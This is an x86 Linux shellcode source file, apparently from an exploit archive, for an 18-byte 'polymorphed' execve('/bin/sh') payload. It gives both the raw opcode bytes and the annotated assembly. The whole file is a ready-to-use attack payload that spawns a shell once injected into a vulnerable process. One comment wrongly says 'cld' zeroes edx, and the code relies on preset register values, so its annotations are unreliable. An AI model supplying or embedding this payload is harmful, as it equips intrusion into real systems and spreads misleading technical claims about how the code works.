; Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
; Date     : 10 Feb 2011
; Author   : kernel_panik
; Thanks   : cOokie, agix, antrhacks
;
; Polymorphed by Re4son: 18 bytes
; re4son [at] whitedome.com.au
; \xfc\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\xcd\x80


global _start           

section .text

_start: 
 cld		   ;; zero out edx
 push edx          ;; push NULL termination
 push 0x68732f6e   ;; hs/n
 push 0x69622f2f   ;; ib//
 mov al, 11
 mov ebx, esp
 int 0x80
